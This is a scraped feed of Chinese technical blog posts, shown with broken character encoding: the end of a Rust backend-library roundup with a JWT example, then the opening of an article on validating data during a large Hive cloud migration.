    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">now</span> = SystemTime::<span class="hljs-title function_ invoke__">now</span>().<span class="hljs-title function_ invoke__">duration_since</span>(UNIX_EPOCH).<span class="hljs-title function_ invoke__">unwrap</span>().<span class="hljs-title function_ invoke__">as_secs</span>();
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">claims</span> = AuthClaims {
        sub: <span class="hljs-string">"user_123"</span>.<span class="hljs-title function_ invoke__">to_owned</span>(),
        role: <span class="hljs-string">"admin"</span>.<span class="hljs-title function_ invoke__">to_owned</span>(),
        exp: (now + <span class="hljs-number">3600</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, <span class="hljs-comment">// 1å°æ—¶æœ‰æ•ˆæœŸ</span>
    };

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">secret</span> = <span class="hljs-string">b"super_secret_key"</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">token</span> = <span class="hljs-title function_ invoke__">encode</span>(
        &amp;Header::<span class="hljs-title function_ invoke__">default</span>(), 
        &amp;claims, 
        &amp;EncodingKey::<span class="hljs-title function_ invoke__">from_secret</span>(secret)
    ).<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Generated JWT: {}"</span>, token);
}
</code></pre>
<hr/>
<h3 data-id="heading-7">å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨</h3>
<p>Rust çš„åº“è™½ç„¶å¼ºå¤§ï¼Œä½†åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.servbay.com" target="_blank" title="https://www.servbay.com" ref="nofollow noopener noreferrer">æœ¬åœ°é…ç½®å¼€å‘ç¯å¢ƒ</a>æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°å·¥å…·é“¾ç‰ˆæœ¬ç®¡ç†ã€ä¾èµ–å†²çªæˆ–æ˜¯ç¯å¢ƒå˜é‡é…ç½®ç¹ççš„é—®é¢˜ã€‚ç‰¹åˆ«æ˜¯åœ¨åŒä¸€å°æœºå™¨ä¸Šå¼€å‘å¤šä¸ªé¡¹ç›®ï¼Œä¸”å®ƒä»¬ä¾èµ–ä¸åŒç‰ˆæœ¬çš„ Rust æˆ–åº•å±‚åº“æ—¶ï¼Œç¯å¢ƒéš”ç¦»å˜å¾—å°¤ä¸ºé‡è¦ã€‚</p>
<p><strong>ServBay</strong> æ˜¯ä¸€ä¸ªå€¼å¾—æ¨èçš„å¼€å‘ç¯å¢ƒç®¡ç†å·¥å…·ï¼Œå®ƒèƒ½å¾ˆå¥½åœ°è§£å†³ä¸Šè¿°ç—›ç‚¹ï¼š</p>
<ul>
<li>
<p><strong>ä¸€é”®å®‰è£… Rust</strong>ï¼šæ— éœ€æ‰‹åŠ¨å¤„ç† rustup é…ç½®æˆ–ç³»ç»Ÿè·¯å¾„ï¼Œç‚¹ä¸€ä¸‹å³å¯è·å¾—å®Œæ•´çš„ Rust ç¼–è¯‘ç¯å¢ƒã€‚</p>
</li>
<li>
<p><strong>æ²™ç›’ç¯å¢ƒ</strong>ï¼šServBay æä¾›äº†ç‹¬ç«‹çš„è¿è¡Œæ²™ç›’ï¼Œè¿™æ„å‘³ç€ä½ åœ¨å…¶ä¸­å®‰è£…çš„ Crates æˆ–ä¿®æ”¹çš„é…ç½®ä¸ä¼šæ±¡æŸ“å®¿ä¸»ç³»ç»Ÿï¼Œä¿æŒå¼€å‘ç¯å¢ƒçš„çº¯å‡€ã€‚</p>
</li>
<li>
<p><strong>ä¸€é”®å¯åœ</strong>ï¼šå¯¹äºä¾èµ– Rust ç¼–å†™çš„åå°æœåŠ¡ï¼ŒServBay æ”¯æŒä¸€é”®å¯åŠ¨å’Œåœæ­¢ï¼Œä¾¿äºå¿«é€Ÿè°ƒè¯•å’Œèµ„æºé‡Šæ”¾ã€‚</p>
</li>
</ul>
<p>ä½¿ç”¨ ServBayï¼Œå¯ä»¥å°†ç²¾åŠ›é›†ä¸­åœ¨ä»£ç é€»è¾‘å’Œåº“çš„ä½¿ç”¨ä¸Šï¼Œè€Œä¸æ˜¯æµªè´¹åœ¨ç¯å¢ƒæ­å»ºå’Œæ’é”™ä¸Šã€‚</p>
<h3 data-id="heading-8">ç»“è®º</h3>
<p>Rust çš„ç”Ÿæ€ç³»ç»Ÿå·²ç»éå¸¸æˆç†Ÿã€‚Crossbeam è§£å†³äº†å¹¶å‘éš¾é¢˜ï¼ŒAxum å’Œ Hyper æä¾›äº†ä»é¡¶å±‚æ¡†æ¶åˆ°åº•å±‚åè®®çš„å®Œæ•´ç½‘ç»œæ ˆï¼ŒDiesel å’Œ Tonic åˆ†åˆ«æå®šäº†æ•°æ®åº“å’Œå¾®æœåŠ¡é€šä¿¡ï¼Œè€Œ Ring å’Œ JWT åˆ™ä¸ºç³»ç»Ÿå®‰å…¨ä¿é©¾æŠ¤èˆªã€‚åˆç†ç»„åˆè¿™äº›åº“ï¼Œè¶³ä»¥æ„å»ºå‡ºæ€§èƒ½ä¸ç¨³å®šæ€§å…¼å¤‡çš„åç«¯æœåŠ¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è´§æ‹‰æ‹‰ç¦»çº¿å¤§æ•°æ®è¿ç§»-éªŒæ•°ç¯‡]]></title>    <link>https://juejin.cn/post/7588996730772029440</link>    <guid>https://juejin.cn/post/7588996730772029440</guid>    <pubDate>2025-12-29T06:18:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588996730772029440" data-draft-id="7587342664078819343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è´§æ‹‰æ‹‰ç¦»çº¿å¤§æ•°æ®è¿ç§»-éªŒæ•°ç¯‡"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-29T06:18:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´§æ‹‰æ‹‰æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è´§æ‹‰æ‹‰ç¦»çº¿å¤§æ•°æ®è¿ç§»-éªŒæ•°ç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´§æ‹‰æ‹‰æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:18:54.000Z" title="Mon Dec 29 2025 06:18:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ•°æ®éªŒè¯èƒŒæ™¯</h2>
<p>åœ¨å‰ä¸¤ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«ä»å®è§‚å±‚é¢æ¢³ç†äº†ç¦»çº¿å¤§æ•°æ®è¿ç§»çš„æ•´ä½“æµç¨‹ä¸å…³é”®æŒ‘æˆ˜ï¼ˆ<a href="https://juejin.cn/post/7551467977931079695" target="_blank" title="https://juejin.cn/post/7551467977931079695">ã€Šè´§æ‹‰æ‹‰ç¦»çº¿å¤§æ•°æ®è·¨äº‘è¿ç§»-ç»¼è¿°ç¯‡ã€‹</a>ï¼‰ï¼Œå¹¶è¯¦ç»†ä»‹ç»äº†å®é™…æ•°æ®è¿ç§»è¿‡ç¨‹ä¸­çš„ç­–ç•¥ã€æ­¥éª¤ä¸æ³¨æ„äº‹é¡¹ï¼ˆ<a href="https://juejin.cn/post/7553924835917152308" target="_blank" title="https://juejin.cn/post/7553924835917152308">ã€Šè´§æ‹‰æ‹‰ç¦»çº¿å¤§æ•°æ®è·¨äº‘è¿ç§» - æ•°æ®è¿ç§»ç¯‡ã€‹</a>ï¼‰ã€‚ç„¶è€Œï¼Œäº‘è¿ç§»å·¥ä½œå¹¶ä¸åœ¨â€œæ•°æ®æ¬è¿å®Œæˆâ€è¿™ä¸€åˆ»ç”»ä¸Šå¥å·â€”â€”è¿ç§»åçš„æ•°æ®æ˜¯å¦å®Œæ•´ã€å‡†ç¡®ã€ä¸€è‡´ï¼Œç›´æ¥å†³å®šäº†ä¸šåŠ¡ç³»ç»Ÿèƒ½å¦å¹³ç¨³åˆ‡æ¢ã€åˆ†æç»“æœèƒ½å¦å¯é å¯ä¿¡ã€‚</p>
<blockquote>
<p>è¿ç§» â‰  æˆåŠŸï¼Œæ•°æ®éªŒè¯æ‰æ˜¯é—­ç¯ã€‚éªŒæ•°æ˜¯è¿ç§»è´¨é‡çš„â€œå®ˆé—¨äººâ€ï¼Œä¹Ÿæ˜¯ä¸šåŠ¡ä¿¡ä»»çš„åŸºçŸ³</p>
</blockquote>
<p>æœ¬ç¯‡å°†å›´ç»•ç¦»çº¿å¤§æ•°æ®è¿ç§»å<strong>åŒè·‘é˜¶æ®µçš„æ•°æ®éªŒè¯</strong>å±•å¼€ï¼Œæ¶‰åŠå…¬å¸è¿‘ 20 ä¸ªéƒ¨é—¨ã€æ•°ä¸‡å¼ Hiveè¡¨çš„æ•°æ®ï¼Œæ¢è®¨éªŒè¯çš„ç›®æ ‡ä¸åŸåˆ™ã€å¸¸è§çš„éªŒè¯æ–¹æ³•ä¸å·¥å…·ã€ä¸åŒåœºæ™¯ä¸‹çš„éªŒè¯ç­–ç•¥ï¼Œä»¥åŠåœ¨å®é™…è½åœ°ä¸­éœ€è¦å…³æ³¨çš„æ€§èƒ½ä¸æˆæœ¬å¹³è¡¡ã€‚é€šè¿‡ç³»ç»ŸåŒ–çš„æ•°æ®éªŒè¯æµç¨‹ï¼Œæˆ‘ä»¬ä¸ä»…èƒ½å¤Ÿå‘ç°å¹¶ä¿®æ­£è¿ç§»è¿‡ç¨‹ä¸­çš„é—®é¢˜ï¼Œè¿˜èƒ½ä¸ºåç»­çš„æ•°æ®æ²»ç†ä¸è´¨é‡ç®¡ç†å¥ å®šåšå®åŸºç¡€ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ•°æ®éªŒè¯æŒ‘æˆ˜</h2>
<ul>
<li><strong>æŒ‘æˆ˜ 1ï¼šè·¨äº‘åŒè·‘éªŒæ•°éš¾</strong>
<ul>
<li>é—®é¢˜èƒŒæ™¯ï¼š
<ul>
<li>åŒè·‘é˜¶æ®µï¼Œæºç«¯ä¸å°ç½‘ï¼Œæ¯æ—¥éƒ½æœ‰å¤§é‡çš„ä»»åŠ¡SQLå˜æ›´ã€Hiveä¸Šä¸‡è¡¨æ–°å¢/ä¿®æ”¹åˆ†åŒºæ•°æ®ã€‚éœ€è¦å¯¹åŒè·‘ç»“æœè¿›è¡Œæ ¡éªŒï¼ŒåŒ…æ‹¬è¡¨åˆ†åŒºçº§ COUNT æ ¡éªŒ å’Œ è¡Œçº§æ˜ç»†æ¯”å¯¹ã€‚æ ¡éªŒè¿‡ç¨‹éœ€åŒæ—¶ä»ä¸¤æœµäº‘æŸ¥è¯¢æ•°æ®ï¼Œæ¶‰åŠè·¨äº‘è®¿é—®ã€‚</li>
</ul>
</li>
<li>ä¸»è¦æŒ‘æˆ˜ï¼š
<ul>
<li>ç½‘ç»œç“¶é¢ˆï¼š è·¨äº‘é“¾è·¯å¸¦å®½æœ‰é™ï¼ˆçº¦ 100Gbï¼‰ï¼Œç›´æ¥è·¨äº‘è¯»å–æ•°æ®ä¼šå¯¼è‡´é«˜å»¶è¿Ÿä¸ä¼ è¾“å¼€é”€ã€‚</li>
<li>è®¡ç®—å‹åŠ›ï¼š æ¯æ—¥éœ€å¤„ç†æ•°ä¸‡å¼ è¡¨åŠè¡Œçº§æ•°æ®ï¼Œè®¡ç®—é‡å¤§ï¼Œå®¹æ˜“å ç”¨ç”Ÿäº§é›†ç¾¤èµ„æºï¼Œå½±å“ä¸šåŠ¡è¿è¡Œã€‚</li>
<li>åŠ¨æ€æ•°æ®å¹²æ‰°å¤šï¼šæŠ½æ•°éš¾å¯¹é½ï¼Œæºç«¯å†™å…¥ä¸ç›®æ ‡ç«¯åŒè·‘å¹¶è¡Œï¼Œæ•°æ®ç‰ˆæœ¬æ˜“é”™ä¹±ï¼ˆå¦‚ ETL é€»è¾‘å˜æ›´ï¼‰</li>
</ul>
</li>
<li>åº”å¯¹æ€è·¯ï¼š
<ul>
<li>é‡‡ç”¨â€œäº‘å†…æ¯”å¯¹ + åˆ†å±‚éªŒè¯ï¼ˆç²—éªŒ / ç²¾éªŒï¼‰â€ç­–ç•¥ï¼Œæ„å»ºè‡ªåŠ¨åŒ–éªŒæ•°å·¥å…·ï¼Œæ”¯æŒå¤šç»´åº¦æ¯”å¯¹ï¼ˆè¡Œçº§ã€å­—æ®µçº§ã€èšåˆçº§ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li><strong>æŒ‘æˆ˜ 2ï¼šé”™è¯¯å½’å› ä¸ä¿®å¤éš¾</strong>
<ul>
<li>å·®å¼‚å¯èƒ½æºäºå·¥å…·ã€æºç«¯/ç›®æ ‡ç«¯å¼‚å¸¸æˆ–ä¸šåŠ¡å˜æ›´ï¼Œæ’æŸ¥é“¾è·¯é•¿ã€‚</li>
<li>åº”å¯¹æ€è·¯ ï¼šè‡ªåŠ¨åŒ–éªŒæ•°æŠ¥å‘Š+é—­ç¯è·Ÿè¸ªæœºåˆ¶ã€‚</li>
</ul>
</li>
<li><strong>æŒ‘æˆ˜ 3ï¼šä¸šåŠ¡éªŒæ”¶ååŒéš¾</strong>
<ul>
<li>æ¶‰åŠéƒ¨é—¨å¤šä¸”æ•°æ®å‡†ç¡®æ€§è¦æ±‚å¤šæ ·åŒ–ï¼Œæ ¸å¿ƒè¡¨éœ€ 100%ä¸€è‡´ï¼Œéæ ¸å¿ƒè¡¨å…è®¸åˆç†è¯¯å·®ã€‚</li>
<li><strong>åº”å¯¹æ€è·¯</strong> ï¼šåˆ†çº§éªŒè¯ï¼ˆP0/P1ï¼‰+ä¸“å®¶ç²¾éªŒï¼ŒåŒ¹é…ä¸šåŠ¡ä¼˜å…ˆçº§ï¼Œè´£ä»»åˆ°äººã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€éªŒæ•°æ–¹æ¡ˆè®¾è®¡</h2>
<h3 data-id="heading-3">1. æ•´ä½“æ–¹æ¡ˆ</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65251be13b1445fea8d68d5a5b46c38d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=PV7crhkz1Wf7%2BnmAup3mdNFNPho%3D" alt="1.png" loading="lazy"/>
å­˜é‡æ•°æ®è¿ç§»å®Œæˆåè¿›å…¥é“¾è·¯åŒè·‘æœŸï¼Œè¿™æœŸé—´æºç«¯é›†ç¾¤ä¸å°ç½‘ï¼Œæ¯å¤©éƒ½æœ‰å¤§é‡çš„ä»»åŠ¡ä»£ç å˜æ›´å’Œæ–°æ•°æ®ç”Ÿæˆï¼Œ<strong>æ•°æ®éªŒæ”¶é€šè¿‡æ‰èƒ½ä¿éšœä¸šåŠ¡ç³»ç»Ÿå¹³ç¨³åˆ‡æ¢</strong>ã€‚æˆ‘ä»¬ä¸»è¦é€šè¿‡å¦‚ä¸‹æ­¥éª¤åšåˆ°åœ¨ä¸šåŠ¡è¿è¡Œæ— æ„Ÿçš„æƒ…å†µä¸‹å®Œæˆç¨³å®šã€é«˜æ•ˆçš„æ•°æ®éªŒè¯ï¼š</p>
<ul>
<li><strong>å‡†å¤‡é“¾è·¯åŒè·‘ç¯å¢ƒ</strong>ï¼šå‡†å¤‡åŒè·‘ç¯å¢ƒï¼Œç½‘ç»œéš”ç¦»ã€ä»»åŠ¡ä»£ç è‡ªåŠ¨åŒæ­¥ã€å†»ç»“ä¸å¯åŒè·‘ä»»åŠ¡ï¼Œé˜²æ­¢åŒè·‘é“¾è·¯æ±¡æŸ“çº¿ä¸Šæ•°æ®ï¼Œæ­å»ºäº†ä¸€å¥—<strong>éš”ç¦»ã€åŒæ­¥ã€å¯æ§çš„åŒè·‘ç¯å¢ƒ</strong></li>
<li><strong>é«˜æ•ˆæ•°æ®å¯¹æ¯”å·¥å…·</strong>ï¼šè·¨äº‘è¡¨æ•°æ®è‡ªåŠ¨å¯¹æ¯”ï¼Œæ”¯æŒè¡¨è¡Œçº§å’Œåˆ—çº§çš„ç²—éªŒï¼ˆæ•°æ®é‡ï¼‰å’Œç²¾éªŒï¼ˆæ˜ç»†ï¼Œæ”¯æŒè®¾å®šæµ®ç‚¹æ•°ç²¾åº¦ï¼‰ï¼›è‡ªåŠ¨ç”Ÿæˆå¯¹æ¯”æŠ¥å‘Šï¼Œè®°å½•è¡¨å’Œåˆ—çš„æ•°æ®ä¸ä¸€è‡´å æ¯”ä»¥åŠä¸ä¸€è‡´çš„æ˜ç»†æ•°æ®ï¼Œ<strong>å¤§å¹…æå‡éªŒæ•°æ•ˆç‡</strong></li>
<li><strong>æ•°æ®éªŒè¯ç­–ç•¥ä¸å®æ–½</strong>ï¼šæŒ‰ç…§åˆ†å±‚ã€åˆ†çº§ã€åˆ†é˜¶æ®µã€åˆ†éƒ¨é—¨çš„ç­–ç•¥å¯¹20ä¸‡+çš„Hiveè¡¨è¿›è¡ŒéªŒæ•°ï¼Œå½’å› åˆ†ææ•°æ®ä¸ä¸€è‡´åŸå› å¹¶ä¿®å¤ï¼Œ<strong>ååŠ©ä¸šåŠ¡éƒ¨é—¨å®Œæˆè¡¨æ•°æ®ä¸€è‡´æ€§éªŒæ”¶</strong></li>
</ul>
<h2 data-id="heading-4">å››ã€ éªŒæ•°å®æ–½</h2>
<h3 data-id="heading-5">1. åŒè·‘ç¯å¢ƒå‡†å¤‡</h3>
<p>åœ¨å­˜é‡æ•°æ®è¿ç§»åŸºæœ¬å®Œæˆåï¼Œç³»ç»Ÿæ­£å¼è¿›å…¥<strong>é“¾è·¯åŒè·‘é˜¶æ®µ</strong>â€”â€”è¿™æ˜¯æ•°æ®éªŒè¯æœ€å…³é”®çš„çª—å£æœŸã€‚æ­¤é˜¶æ®µï¼Œ<strong>æºç«¯é›†ç¾¤ä¿æŒå®Œå…¨å¼€æ”¾</strong>ï¼Œä¸šåŠ¡ä»»åŠ¡ç…§å¸¸è¿è¡Œï¼ŒETL ä»£ç æŒç»­è¿­ä»£ï¼Œæ¯æ—¥ä»æœ‰ 500TB+å¢é‡æ•°æ®å†™å…¥ã€‚ä¸ºç¡®ä¿éªŒè¯è¿‡ç¨‹ä¸å½±å“çº¿ä¸Šç¨³å®šæ€§ï¼ŒåŒæ—¶åˆèƒ½çœŸå®æ¨¡æ‹Ÿåˆ‡æ¢åçš„è¿è¡ŒçŠ¶æ€ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€å¥—<strong>éš”ç¦»ã€åŒæ­¥ã€å¯æ§</strong>çš„åŒè·‘ç¯å¢ƒã€‚</p>
<h4 data-id="heading-6">1.1 ç½‘ç»œä¸èµ„æºéš”ç¦»</h4>
<ul>
<li><strong>ç‰©ç†éš”ç¦»</strong>ï¼šç›®æ ‡äº‘ç¯å¢ƒç‹¬ç«‹éƒ¨ç½² Hive Metastoreã€YARN é›†ç¾¤ã€è°ƒåº¦ç³»ç»Ÿï¼Œä¸æºç«¯æ— å…±äº«å­˜å‚¨æˆ–å…ƒæ•°æ®æœåŠ¡ï¼Œé¿å…äº¤å‰æ±¡æŸ“ã€‚</li>
<li><strong>ç½‘ç»œç­–ç•¥</strong>ï¼šé€šè¿‡ VPC å¯¹ç­‰è¿æ¥æˆ–ä¸“çº¿æ‰“é€šè·¨äº‘é€šé“ï¼Œé™åˆ¶ç›®æ ‡ç«¯ä»…å…è®¸ Kirkè¿ç§» å·¥å…·å’ŒåŒè·‘ä»»åŠ¡å†™å…¥ï¼Œç¦æ­¢å¤–éƒ¨è®¿é—® ã€‚</li>
<li><strong>èµ„æºä¿éšœ</strong>ï¼šä¸ºåŒè·‘ä»»åŠ¡åˆ†é…ç‹¬ç«‹ YARN é˜Ÿåˆ—å’Œè®¡ç®—èµ„æºï¼Œé¿å…ä¸ç”Ÿäº§ä»»åŠ¡äº‰æŠ¢èµ„æºï¼Œç¡®ä¿éªŒè¯è¿‡ç¨‹ä¸å½±å“æ ¸å¿ƒé“¾è·¯ SLAã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6babe110086749748769d82eea79b226~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=Xv%2BpDAyq2V8NltVHBA9gh6qD9Ng%3D" alt="2.png" loading="lazy"/></li>
</ul>
<h4 data-id="heading-7">1.2 ä»»åŠ¡ä»£ç è‡ªåŠ¨åŒæ­¥</h4>
<p>ä¸ºç¡®ä¿è®¡ç®—ä»»åŠ¡ä»£ç ã€æ•°æ®åŠå…ƒæ•°æ®åœ¨å¤šç¯å¢ƒé—´çš„é«˜åº¦ä¸€è‡´æ€§ï¼Œæ•°æ®å¹³å°è‡ªä¸»ç ”å‘äº†è‡ªåŠ¨åŒæ­¥åŠŸèƒ½ã€‚è¯¥åŠŸèƒ½å®ç°äº†ä¸»ç¯å¢ƒåˆ°å¤‡ç¯å¢ƒçš„å®æ—¶åŒå‘åŒæ­¥ï¼Œå½“ç”¨æˆ·åœ¨ä¸»ç¯å¢ƒè¿›è¡Œä»£ç ä¿®æ”¹ã€æ•°æ®æ›´æ–°æˆ–é…ç½®è°ƒæ•´æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ã€ç²¾å‡†åœ°å°†å˜æ›´å†…å®¹åŒæ­¥è‡³å¤‡ç¯å¢ƒã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fb75efa40c34f5dbeee1cad313a2b06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=dJFJkZVBvXJCibk%2Bo1sBXqN9w2U%3D" alt="3.png" loading="lazy"/></p>
<h4 data-id="heading-8">1.3 ä¸å¯åŒè·‘ä»»åŠ¡å†»ç»“æœºåˆ¶</h4>
<p>å¹¶éæ‰€æœ‰ä»»åŠ¡éƒ½é€‚åˆåŒè·‘ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>å¼ºä¾èµ–æºç«¯ç‰¹å®šç»„ä»¶ï¼ˆå¦‚è‡ªå®šä¹‰ UDFã€æœ¬åœ°ç¼“å­˜ï¼‰ï¼›</li>
<li>æ¶‰åŠå¤–éƒ¨ç³»ç»Ÿå†™å…¥ï¼ˆå¦‚ DBã€MQï¼‰ï¼ŒåŒè·‘ä¼šå¯¼è‡´é‡å¤å†™å…¥ï¼›</li>
<li>ä»»åŠ¡æœ¬èº«å…·æœ‰å¹‚ç­‰ç ´åæ€§ï¼ˆå¦‚ deleteã€drop æ“ä½œï¼‰ã€‚</li>
</ul>
<blockquote>
